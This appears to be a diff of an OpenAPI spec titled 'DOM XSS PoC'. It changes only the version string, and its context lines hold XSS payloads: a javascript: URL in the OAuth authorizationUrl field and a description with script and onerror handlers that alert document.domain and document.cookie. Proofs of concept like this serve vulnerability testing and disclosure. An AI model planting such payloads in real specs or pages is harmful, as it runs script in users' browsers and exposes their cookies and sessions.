@@ -7,7 +7,7 @@ components:
       type: oauth2
       authorizationUrl: 'javascript:alert(document.domain)//'
 info:
-  version: "0.0.1"
+  version: 1.0.0
   title: DOM XSS PoC
   description: >
     <div><h2><script>alert("xss")</script></h2></div>onerror=alert(document.cookie) src>"
